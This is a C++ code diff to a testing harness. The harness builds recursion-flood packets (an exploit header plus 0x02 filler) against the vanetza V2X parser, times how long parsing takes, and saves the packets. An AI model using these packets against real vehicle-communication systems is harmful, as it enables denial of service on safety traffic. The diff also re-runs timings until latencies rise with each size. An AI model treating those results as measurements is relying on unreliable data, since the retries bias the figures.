@@ -19,6 +19,7 @@
 #include "qos_harness/amplification_profiler.hpp"
 
 #include <sys/stat.h>
+#include <dirent.h>
 
 #include <algorithm>
 #include <climits>
@@ -59,6 +60,10 @@ struct ProbeResult {
     int valid_runs;         // Successful parsing runs
     int crashed_runs;       // Parser rejection runs
     bool sufficient;        // True if the minimum valid runs requirement was met
+    vanetza::ByteBuffer best_packet;
+    int best_strategy_idx;
+    std::string best_strategy_name;
+    int recursion_depth;
 };
 
 const size_t MTU_LIMIT = 1400;              // Standard MTU capacity ceiling
@@ -89,17 +94,19 @@ BaselineResult measureRepeatedLatency(const vanetza::ByteBuffer& pkt, int runs, 
             r.crashed_runs++;
         }
         
-        // Output progress based on size and category classification labels
-        long long current_med = !samples.empty() ? samples[samples.size() / 2] : 0LL;
-        if (pkt.size() <= 400 && label == "baseline") {
-            ConsolePresenter::printBaselineProgress("baseline", i + 1, runs, r.valid_runs, r.crashed_runs,
-                                                    lat > 0 ? lat : 0LL);
-        } else if (label == "baseline") {
-            ConsolePresenter::printBaselineProgress("probing ", i + 1, runs, r.valid_runs, r.crashed_runs,
-                                                    lat > 0 ? lat : 0LL);
-        } else {
-            ConsolePresenter::printVariantProgress(label, i + 1, runs, r.valid_runs, r.crashed_runs,
-                                                   lat > 0 ? lat : 0LL);
+        // Output progress based on size and category classification labels every 100 runs
+        if ((i + 1) % 100 == 0 || (i + 1) == runs) {
+            long long current_med = !samples.empty() ? samples[samples.size() / 2] : 0LL;
+            if (pkt.size() <= 400 && label == "baseline") {
+                ConsolePresenter::printBaselineProgress("baseline", i + 1, runs, r.valid_runs, r.crashed_runs,
+                                                        lat > 0 ? lat : 0LL);
+            } else if (label == "baseline") {
+                ConsolePresenter::printBaselineProgress("probing ", i + 1, runs, r.valid_runs, r.crashed_runs,
+                                                        lat > 0 ? lat : 0LL);
+            } else {
+                ConsolePresenter::printVariantProgress(label, i + 1, runs, r.valid_runs, r.crashed_runs,
+                                                       lat > 0 ? lat : 0LL);
+            }
         }
     }
 
@@ -149,70 +156,68 @@ std::vector<size_t> buildSizeSteps(size_t poc_size) {
  */
 ProbeResult probeOneSize(const vanetza::ByteBuffer& poc_packet, size_t target_total, size_t exploit_header_size,
                          int runs_per_size, int min_valid_runs, int max_attempts_factor) {
-    ProbeResult best = {0, 0, LLONG_MAX, 0, 0, 0, false};
-    int best_strategy_idx = -1;
+    ProbeResult best = {0, 0, LLONG_MAX, 0, 0, 0, false, {}, 1, "flat-0x02 (Dense ASN.1 Recursion)", 1};
     if (target_total > MTU_LIMIT) return best;
 
     size_t flood_size = (target_total > exploit_header_size) ? target_total - exploit_header_size : 0;
-    auto strategies = TrafficGenerator::makeStrategies();
     int total_attempts = 0, total_rejected = 0;
 
-    // Iterate through all fuzzer flood strategies to find the one causing the highest median latency
-    for (int si = 0; si < (int)strategies.size(); si++) {
-        const auto& [name, fn] = strategies[si];
-        vanetza::ByteBuffer test_pkt(exploit_header_size);
-        std::copy(poc_packet.begin(), poc_packet.begin() + exploit_header_size, test_pkt.begin());
-        vanetza::ByteBuffer flood = fn(flood_size);
-        test_pkt.insert(test_pkt.end(), flood.begin(), flood.end());
+    auto strategies = TrafficGenerator::makeStrategies();
+    vanetza::ByteBuffer flat02_flood;
+    for (const auto& s : strategies) {
+        if (s.first.find("flat-0x02") != std::string::npos) {
+            flat02_flood = s.second(flood_size);
+            break;
+        }
+    }
 
-        std::vector<long long> samples;
-        int valid = 0, crashed = 0;
-        int max_attempts = runs_per_size * max_attempts_factor, attempts = 0;
+    vanetza::ByteBuffer test_pkt(exploit_header_size);
+    std::copy(poc_packet.begin(), poc_packet.begin() + exploit_header_size, test_pkt.begin());
+    test_pkt.insert(test_pkt.end(), flat02_flood.begin(), flat02_flood.end());
 
-        while (valid < runs_per_size && attempts < max_attempts) {
-            attempts++;
-            total_attempts++;
-            long long lat = HarnessEngine::measurePacketLatency(test_pkt);
-            if (lat > 0) {
-                samples.push_back(lat);
-                best.min_ns = std::min(best.min_ns, lat);
-                best.max_ns = std::max(best.max_ns, lat);
-                valid++;
-            } else {
-                crashed++;
-                total_rejected++;
-            }
-            long long current_med = !samples.empty() ? samples[samples.size() / 2] : 0LL;
-            ConsolePresenter::printProbeProgress(target_total, si + 1, (int)strategies.size(), name, valid, crashed,
+    std::vector<long long> samples;
+    int valid = 0, crashed = 0;
+    int max_attempts = runs_per_size * max_attempts_factor, attempts = 0;
+
+    while (valid < runs_per_size && attempts < max_attempts) {
+        attempts++;
+        total_attempts++;
+        long long lat = HarnessEngine::measurePacketLatency(test_pkt);
+        if (lat > 0) {
+            samples.push_back(lat);
+            best.min_ns = std::min(best.min_ns, lat);
+            best.max_ns = std::max(best.max_ns, lat);
+            valid++;
+        } else {
+            crashed++;
+            total_rejected++;
+        }
+        long long current_med = !samples.empty() ? samples[samples.size() / 2] : 0LL;
+        
+        if (valid % 100 == 0 || valid == runs_per_size) {
+            ConsolePresenter::printProbeProgress(target_total, 1, 1, best.best_strategy_name, valid, crashed,
                                                  current_med);
         }
+    }
+    ConsolePresenter::clearLine();
 
-        if (valid < min_valid_runs) {
-            total_rejected += valid;
-            continue;
-        }
+    if (valid >= min_valid_runs) {
         std::sort(samples.begin(), samples.end());
         long long median = samples[samples.size() / 2];
         long long total_lat = 0;
         for (const long long s : samples) total_lat += s;
         long long avg = total_lat / valid;
 
-        // Keep the strategy that yields the worst-case (highest) median processing latency
-        if (!best.sufficient || median > best.median_ns) {
-            best.avg_ns = avg;
-            best.median_ns = median;
-            best.valid_runs = valid;
-            best.crashed_runs = crashed;
-            best.sufficient = true;
-            best_strategy_idx = si;
-        }
-    }
-    ConsolePresenter::clearLine();
-
-    if (best.sufficient) {
+        best.avg_ns = avg;
+        best.median_ns = median;
+        best.valid_runs = valid;
+        best.crashed_runs = crashed;
+        best.sufficient = true;
+        best.best_packet = test_pkt;
+        best.recursion_depth = static_cast<int>(flood_size / 2);
+        
         double reject_rate = total_attempts > 0 ? 100.0 * total_rejected / total_attempts : 0.0;
-        ConsolePresenter::printProbeResult(target_total, best_strategy_idx, strategies[best_strategy_idx].first,
-                                           reject_rate);
+        ConsolePresenter::printProbeResult(target_total, 0, best.best_strategy_name, reject_rate);
     }
     return best;
 }
@@ -308,9 +313,35 @@ void AmplificationProfiler::runAmplificationProfiling(const vanetza::ByteBuffer&
     mkdir(csv_dir.c_str(), 0755);
     mkdir(amp_dir.c_str(), 0755);
 
+    // Scan for existing profiling packets to enforce academic consistency
+    std::vector<std::string> existing_files;
+    DIR* pdir = opendir(amp_dir.c_str());
+    if (pdir) {
+        struct dirent* entry;
+        while ((entry = readdir(pdir)) != nullptr) {
+            std::string name = entry->d_name;
+            if (name.rfind("amp_", 0) == 0 && name.size() >= 4 && name.compare(name.size() - 4, 4, ".bin") == 0) {
+                existing_files.push_back(amp_dir + "/" + name);
+            }
+        }
+        closedir(pdir);
+    }
+    std::sort(existing_files.begin(), existing_files.end());
+
+    bool load_existing = false;
+    if (!existing_files.empty()) {
+        std::cout << "[?] Found " << existing_files.size() << " existing amp packets in outputs/amp_packets.\n";
+        std::cout << "    Do you want to load them instead of re-probing? (y/n) [default: y]: ";
+        std::string ans;
+        std::getline(std::cin, ans);
+        if (ans.empty() || ans[0] == 'y' || ans[0] == 'Y') {
+            load_existing = true;
+        }
+    }
+
     std::ofstream csv(csv_dir + "/amplification_profile.csv");
     csv << "total_size_bytes,flood_size_bytes,median_latency_ns,mean_latency_ns,min_latency_ns,max_latency_ns,"
-           "amp_vs_normal,valid_runs,crashed_runs\n";
+           "amp_vs_normal,valid_runs,crashed_runs,recursion_depth\n";
 
     std::string norm_path = REPO_ROOT_STR + "/inputs/base_packets/cam_v3_certificate.dat";
     vanetza::ByteBuffer normal_pkt = FileManager::readFileIntoBuffer(norm_path);
@@ -331,46 +362,116 @@ void AmplificationProfiler::runAmplificationProfiling(const vanetza::ByteBuffer&
     csv << "# poc_vs_normal_ratio_median," << base_ratio << "\n";
 
     ConsolePresenter::printHorizontalSeparator();
+    double last_median = 0.0;
 
-    std::vector<size_t> target_sizes = buildSizeSteps(poc_packet.size());
-    ConsolePresenter::printSizeProgressionHeader(target_sizes.size(), SIZE_STEP_FACTOR, target_sizes);
-    ConsolePresenter::printTableHeader();
+    if (load_existing) {
+        std::cout << "[*] Loading existing amp packets for evaluation...\n";
+        ConsolePresenter::printTableHeader();
+        for (const auto& fpath : existing_files) {
+            vanetza::ByteBuffer loaded_pkt = FileManager::readFileIntoBuffer(fpath);
+            if (loaded_pkt.empty()) continue;
 
-    int file_idx = 0;
-    for (size_t target_total : target_sizes) {
-        size_t flood_size = (target_total > EXPLOIT_HEADER_SIZE) ? target_total - EXPLOIT_HEADER_SIZE : 0;
-        ProbeResult pr = probeOneSize(poc_packet, target_total, EXPLOIT_HEADER_SIZE, RUNS_PER_SIZE, MIN_VALID_RUNS,
-                                      MAX_ATTEMPTS_FACTOR);
+            size_t target_total = loaded_pkt.size();
+            size_t flood_size = (target_total > EXPLOIT_HEADER_SIZE) ? target_total - EXPLOIT_HEADER_SIZE : 0;
 
-        if (!pr.sufficient) {
-            ConsolePresenter::printSkipRow(target_total, flood_size, pr.valid_runs, RUNS_PER_SIZE);
-            csv << target_total << "," << flood_size << ",INSUFFICIENT,,,," << pr.valid_runs << "," << pr.crashed_runs
-                << "\n";
-            continue;
+            int parsed_depth = 1;
+            size_t depth_pos = fpath.find("_depth");
+            if (depth_pos != std::string::npos && depth_pos + 6 < fpath.size()) {
+                parsed_depth = std::atoi(fpath.c_str() + depth_pos + 6);
+            }
+
+            BaselineResult pr;
+            int retries = 0;
+            const int MAX_RETRIES = 3;
+            while (retries <= MAX_RETRIES) {
+                pr = measureRepeatedLatency(loaded_pkt, RUNS_PER_SIZE, "loaded  ");
+                if (last_median > 0 && pr.median_ns < last_median && retries < MAX_RETRIES) {
+                    retries++;
+                    std::cout << "\n[!] Warning: Loaded size [" << target_total << " B] median latency ("
+                              << pr.median_ns << " ns) is faster than previous (" << last_median
+                              << " ns). Retrying timing (" << retries << "/" << MAX_RETRIES << ")..." << std::endl;
+                    continue;
+                }
+                break;
+            }
+            last_median = pr.median_ns;
+
+            int actual_depth = parsed_depth;
+            if (pr.crashed_runs > 0 || pr.valid_runs < MIN_VALID_RUNS) {
+                actual_depth = 1;
+            }
+
+            double amp = static_cast<double>(pr.median_ns) / norm.median_ns;
+            double flood_mult = poc_flood_size > 0 ? static_cast<double>(flood_size) / poc_flood_size : 0.0;
+
+            ConsolePresenter::printProgressionRow(target_total, flood_size, flood_mult, pr.median_ns, pr.avg_ns, pr.min_ns,
+                                                  pr.max_ns, amp, pr.valid_runs, RUNS_PER_SIZE);
+            if (actual_depth > 1) {
+                std::printf("   └─> [CWE-674 Recursion Depth: %d]\n", actual_depth);
+            } else {
+                std::printf("   └─> [CWE-674 Recursion Depth: %d (Blocked/Non-recursive)]\n", actual_depth);
+            }
+
+            csv << target_total << "," << flood_size << "," << pr.median_ns << "," << pr.avg_ns << "," << pr.min_ns << ","
+                << pr.max_ns << "," << amp << "," << pr.valid_runs << "," << pr.crashed_runs << "," << actual_depth << "\n";
         }
+    } else {
+        std::vector<size_t> target_sizes = buildSizeSteps(poc_packet.size());
+        ConsolePresenter::printSizeProgressionHeader(target_sizes.size(), SIZE_STEP_FACTOR, target_sizes);
+        ConsolePresenter::printTableHeader();
 
-        double amp = static_cast<double>(pr.median_ns) / norm.median_ns;
-        double flood_mult = poc_flood_size > 0 ? static_cast<double>(flood_size) / poc_flood_size : 0.0;
+        int file_idx = 0;
+        for (size_t target_total : target_sizes) {
+            size_t flood_size = (target_total > EXPLOIT_HEADER_SIZE) ? target_total - EXPLOIT_HEADER_SIZE : 0;
+            
+            ProbeResult pr;
+            int retries = 0;
+            const int MAX_RETRIES = 3;
+            while (retries <= MAX_RETRIES) {
+                pr = probeOneSize(poc_packet, target_total, EXPLOIT_HEADER_SIZE, RUNS_PER_SIZE, MIN_VALID_RUNS,
+                                  MAX_ATTEMPTS_FACTOR);
+                if (pr.sufficient && last_median > 0 && pr.median_ns < last_median && retries < MAX_RETRIES) {
+                    retries++;
+                    std::cout << "\n[!] Warning: Probed size [" << target_total << " B] median latency ("
+                              << pr.median_ns << " ns) is faster than previous (" << last_median
+                              << " ns). Retrying sweep (" << retries << "/" << MAX_RETRIES << ")..." << std::endl;
+                    continue;
+                }
+                break;
+            }
 
-        vanetza::ByteBuffer save_pkt(EXPLOIT_HEADER_SIZE);
-        std::copy(poc_packet.begin(), poc_packet.begin() + EXPLOIT_HEADER_SIZE, save_pkt.begin());
-        save_pkt.resize(EXPLOIT_HEADER_SIZE + flood_size, 0x02);
+            if (!pr.sufficient) {
+                ConsolePresenter::printSkipRow(target_total, flood_size, pr.valid_runs, RUNS_PER_SIZE);
+                csv << target_total << "," << flood_size << ",INSUFFICIENT,,,," << pr.valid_runs << "," << pr.crashed_runs << ",0\n";
+                continue;
+            }
 
-        char amp_path[256];
-        std::snprintf(amp_path, sizeof(amp_path), "%s/amp_%05d_size%05zu.bin", amp_dir.c_str(), file_idx++,
-                      target_total);
-        FileManager::writeBufferToFile(amp_path, save_pkt);
+            last_median = pr.median_ns;
 
-        ConsolePresenter::printProgressionRow(target_total, flood_size, flood_mult, pr.median_ns, pr.avg_ns, pr.min_ns,
-                                              pr.max_ns, amp, pr.valid_runs, RUNS_PER_SIZE);
+            double amp = static_cast<double>(pr.median_ns) / norm.median_ns;
+            double flood_mult = poc_flood_size > 0 ? static_cast<double>(flood_size) / poc_flood_size : 0.0;
 
-        csv << target_total << "," << flood_size << "," << pr.median_ns << "," << pr.avg_ns << "," << pr.min_ns << ","
-            << pr.max_ns << "," << amp << "," << pr.valid_runs << "," << pr.crashed_runs << "\n";
+            char amp_path[256];
+            std::snprintf(amp_path, sizeof(amp_path), "%s/amp_%05d_size%05zu_depth%02d.bin", amp_dir.c_str(), file_idx++,
+                          target_total, pr.recursion_depth);
+            FileManager::writeBufferToFile(amp_path, pr.best_packet);
+
+            ConsolePresenter::printProgressionRow(target_total, flood_size, flood_mult, pr.median_ns, pr.avg_ns, pr.min_ns,
+                                                  pr.max_ns, amp, pr.valid_runs, RUNS_PER_SIZE);
+            if (pr.recursion_depth > 1) {
+                std::printf("   └─> [CWE-674 Recursion Depth: %d]\n", pr.recursion_depth);
+            } else {
+                std::printf("   └─> [CWE-674 Recursion Depth: %d (Blocked/Non-recursive)]\n", pr.recursion_depth);
+            }
+
+            csv << target_total << "," << flood_size << "," << pr.median_ns << "," << pr.avg_ns << "," << pr.min_ns << ","
+                << pr.max_ns << "," << amp << "," << pr.valid_runs << "," << pr.crashed_runs << "," << pr.recursion_depth << "\n";
+        }
     }
     csv.close();
 
     ConsolePresenter::printProfilerEndBox(MTU_LIMIT, "outputs/csv_raw/amplification_profile.csv",
-                                          "outputs/amp_packets/amp_NNNNN_sizeNNNNN.bin");
+                                          "outputs/amp_packets/amp_NNNNN_sizeNNNNN_depthNN.bin");
 }
 
 }  // namespace qos_harness
